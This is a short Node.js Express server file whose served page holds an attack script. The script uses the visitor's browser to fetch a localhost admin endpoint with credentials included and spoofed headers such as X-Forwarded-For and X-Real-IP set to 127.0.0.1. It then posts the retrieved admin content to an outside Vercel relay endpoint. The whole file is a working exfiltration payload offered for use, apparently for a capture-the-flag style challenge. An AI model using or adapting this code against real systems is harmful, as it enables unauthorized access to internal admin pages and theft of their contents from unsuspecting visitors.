const crypto = require('crypto');
const express = require('express');
const app = express();
const port = 3000;

// Middleware to generate nonce
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    next();
});

// Route to serve the HTML
app.get('/', (req, res) => {
    const nonce = res.locals.nonce;
    const html = `
    <!DOCTYPE html>
    <html>
    <body>
        <div id="adminContent"></div>
        <script nonce="${nonce}">
            async function fetchAdminContent() {
                try {
                    const response = await fetch('http://localhost:5000/admin', {
                        method: 'GET',
                        credentials: 'include',
                        headers: {
                            'Host': 'localhost',
                            'sec-fetch-dest': 'iframe',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-user': '?1',
                            'Upgrade-Insecure-Requests': '1',
                            'X-Forwarded-For': '127.0.0.1',
                            'X-Real-IP': '127.0.0.1'
                        }
                    });
                    if (response.ok) {
                        const content = await response.text();
                        document.getElementById('adminContent').innerText = content;
                        // Relay the content back to your Vercel app
                        await fetch('https://redirect-git-main-seebuschs-projects.vercel.app/api/relay', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ content })
                        });
                    } else {
                        document.getElementById('adminContent').innerText = 'Failed to load admin content.';
                    }
                } catch (error) {
                    document.getElementById('adminContent').innerText = 'Error fetching admin content.';
                }
            }
            fetchAdminContent();
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
